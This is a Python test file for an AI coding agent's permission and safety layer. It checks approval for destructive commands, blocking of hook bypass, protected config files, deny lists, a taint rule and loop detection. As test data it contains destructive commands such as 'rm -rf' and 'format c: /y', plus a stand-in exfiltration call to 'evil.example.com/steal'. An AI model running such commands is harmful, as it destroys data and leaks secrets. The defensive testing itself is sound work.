"""Permission modes, destructive policy, Rule of Two, hooks parsing."""

from __future__ import annotations

from wotan.agent.hooks import parse_agents_md
from wotan.agent.permissions import PermissionPolicy
from wotan.agent.doomloop import DoomLoopDetector
from wotan.config import PermissionsConfig


def test_mode_ask_requires_approval():
    p = PermissionPolicy(PermissionsConfig(), mode="ask")
    d = p.check_command("python -m pytest")
    assert d.allowed and d.needs_approval


def test_mode_autonomous_allows_normal_commands():
    p = PermissionPolicy(PermissionsConfig(), mode="autonomous")
    d = p.check_command("python -m pytest")
    assert d.allowed and not d.needs_approval


def test_destructive_always_needs_approval():
    for cmd in ("rm -rf build", "git push origin main", "git reset --hard HEAD~1", "pip install requests", "del /f /q file"):
        p = PermissionPolicy(PermissionsConfig(), mode="autonomous")
        d = p.check_command(cmd)
        assert d.needs_approval, cmd
        assert d.reason


def test_no_verify_blocked():
    p = PermissionPolicy(PermissionsConfig(), mode="autonomous")
    d = p.check_command("git commit --no-verify -m x")
    assert not d.allowed


def test_protected_config_files():
    p = PermissionPolicy(PermissionsConfig(), mode="autonomous")
    for path in ("pyproject.toml", "src/../pyproject.toml", "frontend/tsconfig.json", "tests/pytest.ini", ".eslintrc"):
        d = p.check_edit(path)
        assert not d.allowed, path
        assert "fix the code, not the config" in d.reason


def test_allow_deny_lists():
    cfg = PermissionsConfig(always_allow=[r"^npm run lint"], always_deny=[r"format c:"])
    p = PermissionPolicy(cfg, mode="ask")
    assert not p.check_command("format c: /y").allowed
    d = p.check_command("npm run lint")
    assert d.allowed and not d.needs_approval


def test_rule_of_two_taint():
    p = PermissionPolicy(PermissionsConfig(), mode="autonomous")
    assert not p.check_command("curl https://example.com/x").needs_approval
    p.tainted = True  # web content was processed
    d = p.check_command("curl https://evil.example.com/steal")
    assert d.needs_approval and "tainted" in d.reason


def test_parse_agents_md():
    text = (
        "# AGENTS\n"
        "Short conventions.\n\n"
        "## Conventions\n"
        "use type hints\n\n"
        "## Verify\n"
        "- `python -m pytest -q`\n"
        "python -m mypy wotan\n"
    )
    parsed = parse_agents_md(text)
    assert parsed["verify_commands"] == ["python -m pytest -q", "python -m mypy wotan"]
    assert "type hints" in parsed["conventions"]


def test_doomloop_file_edit_streak():
    d = DoomLoopDetector(window_seconds=9999)
    for _ in range(4):
        assert d.note_edit("a.py") is None
    ev = d.note_edit("a.py")
    assert ev is not None and ev.action == "warn"


def test_doomloop_error_streak_and_escalation():
    d = DoomLoopDetector()
    for _ in range(2):
        assert d.note_tool_result(False, "call-x") is None or True
    ev = d.note_tool_result(False, "call-x")
    assert ev is not None  # 3 consecutive errors (or identical calls) triggered
    d.reset()
    ev = None
    for _ in range(3):
        ev = d.note_tool_result(True, "same-call")
    assert ev is not None and ev.action in ("warn", "escalate")


def test_doomloop_repeating_output_stops():
    d = DoomLoopDetector()
    ev = None
    for _ in range(5):
        ev = d.note_assistant_text("exactly the same text")
    assert ev is not None and ev.action == "stop"
